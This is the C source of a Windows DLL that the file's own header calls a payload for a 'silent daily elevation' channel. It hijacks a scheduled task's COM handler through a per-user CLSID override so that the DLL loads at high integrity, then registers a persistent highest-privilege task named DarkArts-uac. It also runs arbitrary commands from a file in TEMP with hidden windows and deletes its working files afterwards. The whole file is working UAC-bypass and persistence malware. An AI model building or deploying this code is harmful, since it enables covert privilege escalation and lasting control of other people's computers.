/* darts_ucd.c - ComHandler payload DLL for the silent daily elevation
 * channel. taskhostw activates the UC task's ComHandler CLSID at HIGH once
 * per day (UnifiedConsentSyncTask daily TimeTrigger). With the per-user CLSID
 * override in place this DLL loads instead of the real handler. On load it:
 *   1. bootstraps the reusable HIGHEST \DarkArts-uac task if missing
 *   2. runs the pending command from the work file at HIGH
 * Built with w64devkit: gcc -shared -o darts_ucd.dll darts_ucd.c
 */
#include <windows.h>
#include <stdio.h>
#include <wchar.h>

#define WORKFILE L"darts-uac-work.txt"
#define CFGFILE  L"darts-uac-cfg.json"
#define XMLFILE  L"darts-uac-task.xml"
#define MARKFILE L"uc_daily_marker.txt"
#define TASKNAME L"\\DarkArts-uac"

static wchar_t tempdir[MAX_PATH];

static int IsElevated(void) {
    HANDLE t = NULL;
    DWORD el = 0, ret = 0;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &t)) return -1;
    GetTokenInformation(t, TokenElevation, &el, sizeof(el), &ret);
    CloseHandle(t);
    return el ? 1 : 0;
}

static void Marker(const wchar_t *msg) {
    wchar_t p[MAX_PATH];
    wsprintfW(p, L"%s\\%s", tempdir, MARKFILE);
    HANDLE h = CreateFileW(p, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
                           NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    char buf[512];
    DWORD n = (DWORD)wsprintfA(buf, "pid=%lu il=%d %S\r\n", GetCurrentProcessId(), IsElevated(), msg);
    WriteFile(h, buf, n, &n, NULL);
    CloseHandle(h);
}

static void Join(wchar_t *dst, const wchar_t *name) {
    wsprintfW(dst, L"%s\\%s", tempdir, name);
}

static int ReadText(const wchar_t *path, char *buf, DWORD cap) {
    HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    DWORD n = 0, rd = 0;
    ReadFile(h, buf, cap - 1, &rd, NULL);
    buf[rd] = 0;
    CloseHandle(h);
    return 1;
}

static void WriteUTF16(const wchar_t *path, const char *utf8) {
    int len = MultiByteToWideChar(CP_UTF8, 0, utf8, -1, NULL, 0);
    if (len <= 0) return;
    wchar_t *u = (wchar_t *)LocalAlloc(LMEM_FIXED, len * sizeof(wchar_t));
    if (!u) return;
    MultiByteToWideChar(CP_UTF8, 0, utf8, -1, u, len);
    HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) { LocalFree(u); return; }
    unsigned char bom[2] = { 0xff, 0xfe };
    DWORD n;
    WriteFile(h, bom, 2, &n, NULL);
    WriteFile(h, u, (len - 1) * 2, &n, NULL);
    CloseHandle(h);
    LocalFree(u);
}

static int TaskExists(void) {
    wchar_t cmd[512];
    wsprintfW(cmd, L"schtasks.exe /Query /TN %s", TASKNAME);
    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = { 0 };
    if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) return 1;
    WaitForSingleObject(pi.hProcess, 20000);
    DWORD code = 0;
    GetExitCodeProcess(pi.hProcess, &code);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return code == 0;
}

static void RunSync(wchar_t *cmdline) {
    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = { 0 };
    if (!CreateProcessW(NULL, cmdline, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        Marker(L"spawn-fail");
        return;
    }
    WaitForSingleObject(pi.hProcess, 1000 * 60 * 60);
    DWORD code = 0;
    GetExitCodeProcess(pi.hProcess, &code);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    (void)code;
}

static void Bootstrap(const char *xml) {
    if (!xml || !xml[0]) return;
    if (TaskExists()) return;
    wchar_t xmlpath[MAX_PATH], cmd[4096];
    Join(xmlpath, XMLFILE);
    WriteUTF16(xmlpath, xml);
    wsprintfW(cmd, L"schtasks.exe /Create /TN %s /XML \"%s\" /F", TASKNAME, xmlpath);
    RunSync(cmd);
}

static void RunCommand(char *line, const char *out) {
    if (!line || !line[0]) return;
    wchar_t cmd[8192], *o = NULL;
    if (out && out[0]) {
        int l = MultiByteToWideChar(CP_UTF8, 0, out, -1, NULL, 0);
        o = (wchar_t *)LocalAlloc(LMEM_FIXED, (l + 8) * sizeof(wchar_t));
        if (o) MultiByteToWideChar(CP_UTF8, 0, out, -1, o, l);
    }
    wchar_t *c = (wchar_t *)LocalAlloc(LMEM_FIXED, 8192);
    if (!c) { if (o) LocalFree(o); return; }
    wsprintfW(c, L"cmd.exe /c %S", line);
    if (o) {
        wchar_t redir[256];
        wsprintfW(redir, L" > \"%s\" 2>&1", o);
        lstrcatW(c, redir);
    }
    RunSync(c);
    if (o) {
        HANDLE h = CreateFileW(o, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
                               NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            char m[64];
            DWORD n = (DWORD)wsprintfA(m, "\r\n[exit %lu]\r\n", 0);
            WriteFile(h, m, n, &n, NULL);
            CloseHandle(h);
        }
        LocalFree(o);
    }
    LocalFree(c);
}

static void DoWork(void) {
    GetEnvironmentVariableW(L"TEMP", tempdir, MAX_PATH);
    if (!tempdir[0]) GetTempPathW(MAX_PATH, tempdir);
    wchar_t wp[MAX_PATH], cp[MAX_PATH];
    Join(wp, WORKFILE);
    Join(cp, CFGFILE);
    char buf[16384];
    if (!ReadText(wp, buf, sizeof(buf))) {
        Marker(L"load-no-work");
        return;
    }
    char *line = buf;
    char *out = NULL, *xml = NULL;
    char *nl1 = strchr(buf, '\n');
    if (nl1) {
        *nl1 = 0;
        while (*line && (line[strlen(line) - 1] == '\r')) line[strlen(line) - 1] = 0;
        out = nl1 + 1;
        char *nl2 = strchr(out, '\n');
        if (nl2) {
            *nl2 = 0;
            while (*out && (out[strlen(out) - 1] == '\r')) out[strlen(out) - 1] = 0;
            xml = nl2 + 1;
        }
    }
    Bootstrap(xml);
    RunCommand(line, out);
    DeleteFileW(wp);
    DeleteFileW(cp);
    Marker(L"done");
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
    if (reason == DLL_PROCESS_ATTACH) {
        GetEnvironmentVariableW(L"TEMP", tempdir, MAX_PATH);
        if (!tempdir[0]) GetTempPathW(MAX_PATH, tempdir);
        Marker(L"load");
    }
    return TRUE;
}

STDAPI DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID *ppv) {
    DoWork();
    return REGDB_E_CLASSNOTREG;
}
STDAPI DllCanUnloadNow(void) { return S_FALSE; }
STDAPI DllRegisterServer(void) { return S_OK; }
STDAPI DllUnregisterServer(void) { return S_OK; }